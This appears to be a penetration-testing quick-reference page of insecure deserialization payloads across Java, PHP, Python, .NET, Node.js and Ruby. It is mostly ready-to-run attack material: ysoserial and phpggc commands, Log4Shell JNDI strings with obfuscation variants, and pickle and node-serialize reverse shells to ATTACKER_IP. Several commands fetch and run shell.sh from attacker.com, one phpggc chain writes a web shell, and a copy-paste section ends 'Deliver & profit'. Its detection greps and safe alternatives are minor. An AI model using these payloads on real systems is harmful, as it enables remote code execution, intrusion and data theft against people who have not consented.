# Deserialization Payloads

Quick reference for insecure deserialization attacks across languages.

---

## Detection Signatures

```
# Magic Bytes
Java:       AC ED 00 05 (base64: rO0AB)
PHP:        O:4:"User":1:{s:4:"name";s:5:"admin";}  (object notation)
Python:     \x80\x03 or \x80\x04 (pickle protocols)
.NET:       AAEAAAD///// (BinaryFormatter base64)
Ruby:       \x04\x08 (Marshal.dump)
```

```bash
# Grep for serialized data
grep -r "rO0AB" .                    # Java base64
grep -r "O:[0-9]" .                  # PHP serialized
grep -rP "\x80\x03|\x80\x04" .       # Python pickle
grep -r "AAEAAAD" .                  # .NET BinaryFormatter
```

---

## Java Deserialization

### Magic Bytes
```
Hex:    AC ED 00 05
Base64: rO0AB
```

### ysoserial Gadgets

```bash
# Generate payloads
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/$(whoami)' | base64
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3...}|{base64,-d}|{bash,-i}'
java -jar ysoserial.jar CommonsCollections7 'wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh'

# Common gadget chains
CommonsCollections1-7   # Apache Commons Collections 3.x/4.x
CommonsCollections10    # CC 4.0
CommonsCollections11    # CC 3.2.2
CommonsCollections12    # CC 4.4.2
CommonsCollections13    # CC 3.2.2
Groovy1                 # Groovy 1.7-2.4
Spring1/2               # Spring Framework
JBossInterceptors1      # JBoss
Hibernate1/2            # Hibernate
Jdk7u21                 # JRE < 7u25, 6u51
Jython1                 # Jython
BeanShell1              # BeanShell
C3P0                    # C3P0 connection pool
URLDNS                  # DNS lookup (detection only)
JRMPClient              # JRMP callback
JRMPListener            # JRMP listener
```

### ysoserial-modified

```bash
# Extended gadgets
java -jar ysoserial-modified.jar CommonsCollections8 'cmd'
java -jar ysoserial-modified.jar CommonsCollections9 'cmd'
java -jar ysoserial-modified.jar CommonsCollections10 'cmd'
```

### JNDI Injection (Log4Shell style)

```java
// Payload strings
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

// Obfuscation
${${lower:j}ndi:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
${j${::-n}di:ldap://attacker.com/a}
```

### Detection Points

```java
// Vulnerable patterns
ObjectInputStream ois = new ObjectInputStream(userInput);
Object obj = ois.readObject();  // VULNERABLE

// XMLDecoder
XMLDecoder decoder = new XMLDecoder(userInput);
decoder.readObject();  // VULNERABLE

// XStream
XStream xs = new XStream();
xs.fromXML(userInput);  // VULNERABLE (pre-1.4.18)
```

### Burp Extensions

```
Java Deserialization Scanner
GadgetProbe
Freddy
```

---

## PHP Deserialization

### Object Injection

```php
// Vulnerable pattern
$data = unserialize($_GET['data']);  // VULNERABLE

// Magic methods exploited
__wakeup()     // Called on unserialize()
__destruct()   // Called on object destruction
__toString()   // Called on string conversion
__call()       // Called on undefined method
```

### Basic Payloads

```php
// Simple object
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Nested object
O:3:"Obj":1:{s:4:"data";O:4:"File":1:{s:4:"path";s:11:"/etc/passwd";}}

// Boolean true injection
O:4:"User":1:{s:8:"is_admin";b:1;}

// Array injection
a:2:{i:0;s:5:"admin";i:1;s:5:"admin";}
```

### POP Chain Example

```php
// Gadget chain exploitation
O:8:"Gadget1":1:{s:4:"next";O:8:"Gadget2":1:{s:3:"cmd";s:2:"id";}}
```

### phar:// Deserialization

```php
// Create malicious phar
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER();');
$phar->setMetadata($malicious_object);  // Serialized here
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

// Trigger points (any file operation)
file_exists('phar://uploads/avatar.jpg');
file_get_contents('phar://uploads/avatar.jpg');
include('phar://uploads/avatar.jpg');
fopen('phar://uploads/avatar.jpg', 'r');
copy('phar://uploads/avatar.jpg', '/tmp/x');
unlink('phar://uploads/avatar.jpg');
stat('phar://uploads/avatar.jpg');
md5_file('phar://uploads/avatar.jpg');
getimagesize('phar://uploads/avatar.jpg');

// Polyglot (JPEG + PHAR)
# Prepend JPEG header to phar
cat header.jpg shell.phar > polyglot.jpg
```

### PHPGGC - PHP Gadget Generator

```bash
# List gadgets
phpggc -l

# Generate payload
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 exec 'id'
phpggc Monolog/RCE1 exec 'id'
phpggc Guzzle/RCE1 exec 'id'
phpggc Doctrine/RCE1 exec 'id'
phpggc Slim/RCE1 exec 'id'
phpggc ThinkPHP/RCE1 exec 'id'
phpggc WordPress/RCE1 exec 'id'

# Output formats
phpggc -b Laravel/RCE1 system id          # Base64
phpggc -u Laravel/RCE1 system id          # URL encoded
phpggc -s Laravel/RCE1 system id          # Soft URL encode
phpggc -j Laravel/RCE1 system id          # JSON
phpggc --phar phar Laravel/RCE1 system id # PHAR file
phpggc --phar phar-jpeg Laravel/RCE1 system id  # PHAR polyglot

# Fast destruct (bypass wakeup)
phpggc -f Laravel/RCE1 system id
```

### Common Frameworks

```bash
# Laravel
phpggc Laravel/RCE1-16 system 'id'

# Symfony
phpggc Symfony/RCE1-9 exec 'id'

# Monolog (common logging)
phpggc Monolog/RCE1-8 exec 'id'

# WordPress
phpggc WordPress/RCE1-2 exec 'id'

# Drupal
phpggc Drupal/RCE1 exec 'id'

# Magento
phpggc Magento/SQLI1 'SELECT version()'
phpggc Magento/FW1 /var/www/html/shell.php shell.php
```

---

## Python Pickle

### Basic RCE Payload

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Reverse Shell

```python
import pickle
import base64
import os

class RevShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',))

print(base64.b64encode(pickle.dumps(RevShell())).decode())
```

### Alternative Methods

```python
# Using subprocess
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (('id',),))

# Using exec
class RCE:
    def __reduce__(self):
        return (exec, ('import os;os.system("id")',))

# Using eval
class RCE:
    def __reduce__(self):
        return (eval, ('__import__("os").system("id")',))
```

### Raw Pickle Opcodes

```python
# Manual pickle payload
b'''cos
system
(S'id'
tR.'''

# Encoded
import base64
payload = b"cos\nsystem\n(S'id'\ntR."
print(base64.b64encode(payload).decode())
```

### Detection Points

```python
# Vulnerable patterns
pickle.loads(user_input)     # VULNERABLE
pickle.load(file_obj)        # VULNERABLE if file controlled
yaml.load(data)              # VULNERABLE (PyYAML < 5.1)
yaml.unsafe_load(data)       # VULNERABLE

# Safe alternatives
yaml.safe_load(data)
json.loads(data)
```

---

## .NET Deserialization

### Magic Bytes / Signatures

```
BinaryFormatter Base64: AAEAAAD/////
NetDataContractSerializer: <NetDataContract
LosFormatter: similar to BinaryFormatter
ObjectStateFormatter: /wE (base64 prefix)
```

### BinaryFormatter

```csharp
// Vulnerable pattern
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // VULNERABLE
```

### JSON.NET TypeNameHandling

```csharp
// Vulnerable settings
TypeNameHandling.All        // VULNERABLE
TypeNameHandling.Auto       // VULNERABLE
TypeNameHandling.Objects    // VULNERABLE
TypeNameHandling.Arrays     // VULNERABLE

// Payload
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### ysoserial.net

```powershell
# Generate payloads
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc" -o raw
ysoserial.exe -g PSObject -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc"
ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c "calc"

# Common gadgets
ActivitySurrogateSelector
ObjectDataProvider
TextFormattingRunProperties
TypeConfuseDelegate
WindowsIdentity
ClaimsPrincipal
PSObject

# Common formatters
BinaryFormatter
SoapFormatter
NetDataContractSerializer
LosFormatter
ObjectStateFormatter
Json.Net
FastJson
JavaScriptSerializer
XmlSerializer
DataContractSerializer
```

### ViewState Deserialization

```bash
# Decode ViewState
echo "BASE64_VIEWSTATE" | base64 -d | xxd

# If MAC validation disabled
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc"

# With known machineKey
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc" \
  --validationkey="KEY" --validationalg="SHA1" --generator="GENERATOR"
```

---

## Node.js Deserialization

### node-serialize RCE

```javascript
// Vulnerable pattern
var serialize = require('node-serialize');
var payload = serialize.unserialize(user_input);  // VULNERABLE

// RCE payload (IIFE)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}

// Reverse shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"',function(error,stdout,stderr){console.log(stdout)});}()"}
```

### funcster

```javascript
// Vulnerable
var funcster = require('funcster');
funcster.deepDeserialize(user_input);  // VULNERABLE

// Payload
{"__js_function":"function(){return require('child_process').execSync('id').toString()}()"}
```

### cryo

```javascript
// Payload
{"__proto__":{"toString":{"__js_function":"function(){return require('child_process').execSync('id').toString()}"}}}
```

---

## Ruby Deserialization

### Marshal RCE

```ruby
# Magic bytes: \x04\x08

# Vulnerable pattern
Marshal.load(user_input)  # VULNERABLE

# Detection
data[0..1] == "\x04\x08"
```

### Universal RCE Gadget (Ruby 2.x)

```ruby
require 'base64'

code = 'system("id")'

payload = <<-PAYLOAD
\x04\x08o:@Gem::Requirement\x07:\x10@requirementsI"\x08pwd\x06:\x06ET:\x12@_marshal_\x5b\x06o:!Gem::DependencyList\x07:\x0b@specs[\x06o:\x18Gem::StubSpecification\x06:\x11@loaded_from"#{code.length + 2}#{code}\x00:\x10@development#{Base64.strict_encode64(code)}
PAYLOAD

puts Base64.strict_encode64(payload)
```

### ERB Template Injection via Marshal

```ruby
require 'erb'

class Exploit
  def initialize
    @src = "<%= `id` %>"
    @filename = "x"
    @lineno = 1
  end
end

payload = Marshal.dump(ERB.new(nil).tap { |e|
  e.instance_variable_set(:@src, "<%= `id` %>")
  e.instance_variable_set(:@filename, "x")
})
```

### YAML Deserialization

```ruby
# Vulnerable
YAML.load(user_input)       # VULNERABLE (Ruby < 2.1 / Psych < 2.0)
YAML.unsafe_load(user_input)  # VULNERABLE

# Safe
YAML.safe_load(user_input)

# Payload
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: id
      method_id: :resolve
```

---

## Common Vulnerable Patterns

### Look For

```
# Java
ObjectInputStream.readObject()
XMLDecoder.readObject()
XStream.fromXML()
readObject(), readResolve()
Serializable, Externalizable interfaces

# PHP
unserialize()
phar:// wrapper usage
__wakeup, __destruct, __toString

# Python
pickle.loads(), pickle.load()
yaml.load() (without Loader=SafeLoader)
shelve module

# .NET
BinaryFormatter.Deserialize()
NetDataContractSerializer
TypeNameHandling != None
JavaScriptSerializer with type resolvers

# Node.js
node-serialize
funcster
cryo
serialize-javascript (with eval)

# Ruby
Marshal.load()
YAML.load()
```

### HTTP Headers/Params to Test

```
Cookie (base64 encoded objects)
Authorization tokens (JWT with serialized payloads)
Session storage
ViewState (.NET)
__VIEWSTATE, __EVENTVALIDATION
X-* custom headers
POST body (SOAP, XML, JSON)
```

---

## Tools

```bash
# Java
java -jar ysoserial.jar [gadget] '[command]'
java -jar ysoserial-modified.jar [gadget] '[command]'
java -jar JNDIExploit.jar -i ATTACKER_IP
java -jar marshalsec.jar [gadget] [args]

# PHP
phpggc [chain] [function] '[command]'
phpggc -l  # List all chains

# .NET
ysoserial.exe -g [gadget] -f [formatter] -c "[command]"

# Python (generate)
python3 -c "import pickle,base64,os;print(base64.b64encode(pickle.dumps(type('x',(object,),{'__reduce__':lambda s:(os.system,('id',))})())))"

# Detection
grep -rn "ObjectInputStream" --include="*.java" .
grep -rn "unserialize" --include="*.php" .
grep -rn "pickle.load" --include="*.py" .
grep -rn "Marshal.load" --include="*.rb" .
grep -rn "BinaryFormatter" --include="*.cs" .

# Burp Extensions
Java Deserialization Scanner
Freddy (multiple languages)
PHP Object Injection
```

---

## Quick Payloads (Copy-Paste)

```bash
# Java DNS callback (detection)
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64 -w0

# Java RCE
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/$(whoami)' | base64 -w0

# PHP
phpggc -b Laravel/RCE1 system 'id'

# Python pickle (base64)
python3 -c "import pickle,base64,os;print(base64.b64encode(pickle.dumps(type('x',(object,),{'__reduce__':lambda s:(os.system,('id',))})())).decode())"

# Node.js node-serialize
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
```

---

!!! tip "Attack Flow"
    `Identify serialized data` → `Determine language/format` → `Find gadget chain` → `Generate payload` → `Deliver & profit`

---
*Tools: [ysoserial](https://github.com/frohoff/ysoserial) | [PHPGGC](https://github.com/ambionics/phpggc) | [ysoserial.net](https://github.com/pwntester/ysoserial.net)*
